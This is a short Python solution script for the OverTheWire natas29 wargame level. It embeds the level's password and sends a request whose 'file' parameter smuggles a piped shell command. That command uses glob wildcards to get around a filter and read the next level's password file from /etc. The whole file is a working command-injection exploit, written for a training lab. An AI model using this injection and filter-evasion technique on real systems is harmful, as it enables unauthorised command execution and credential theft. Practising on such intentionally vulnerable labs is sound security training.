import requests

username = "natas29"
passsowrd = "pc0w0Vo0KpTHcEsgMhXu2EwUzyYemPno"

url = "http://%s.natas.labs.overthewire.org/"%username

parameter = "|cat /etc/n??as_webpass/n?tas30 " # u can use single space instead of %00

sesssion = requests.Session()
response = sesssion.get(url+ "index.pl?file=" + parameter ,auth=(username,passsowrd) )
content = response.text
print(content)




